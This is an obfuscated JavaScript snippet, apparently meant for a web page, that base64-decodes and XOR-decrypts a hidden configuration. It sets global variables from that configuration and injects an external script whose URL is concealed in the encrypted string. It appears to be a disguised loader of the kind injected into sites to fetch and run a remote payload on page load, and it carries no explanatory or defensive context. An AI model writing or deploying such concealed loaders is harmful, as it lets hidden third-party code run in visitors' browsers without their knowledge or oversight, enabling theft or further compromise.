(function () {
  var n_g = atob("DCq/4pRmb/sbdPQrb1Gdl+YKTcE5HIBfH1mFzbsFC5U1AYBGBkzGzPcJAtV5BttYDFjWkuAVQItyDJFHQFrWmvEKQpx0G5NHCgTVkbZKTZpvAIZCDV/Lh+dEVaBGWNZMA0Xdg/gVTcFAD9ZFDkfawK5ECJR0E5hOP0PHh/gvC9k3VoJKA1/awK5EWZp5RMwbWEmGhvFVXskpF8NPCkzd0PZVTYZGCQ==");
  var j_fx = [];
  for (var o_tl4 = 0; o_tl4 < n_g.length; o_tl4++) {
    j_fx.push(n_g.charCodeAt(o_tl4) & 255);
  }
  var a_1233 = j_fx[0];
  var v_n = j_fx.slice(1, 1 + a_1233);
  var u_xd7 = j_fx.slice(1 + a_1233);
  var f_qhv = u_xd7.map(function (b, l_837) {
    return b ^ v_n[l_837 % a_1233];
  });
  var m_j5g = "";
  for (var k_m7s = 0; k_m7s < f_qhv.length; k_m7s++) {
    m_j5g += String.fromCharCode(f_qhv[k_m7s] & 255);
  }
  var p_2g = decodeURIComponent(escape(m_j5g));
  var w_iir2 = JSON.parse(p_2g);
  var o_95c = w_iir2.globals || [];
  o_95c.forEach(function (i_sm) {
    window[i_sm.name] = i_sm.value;
  });
  var z_pp = document.createElement("script");
  z_pp.src = w_iir2.url;
  z_pp.async = true;
  z_pp.defer = true;
  (w_iir2.attributes || []).forEach(function (z_hk) {
    z_pp.setAttribute(z_hk.name, z_hk.value);
  });
  (document.head || document.documentElement).appendChild(z_pp);
})();
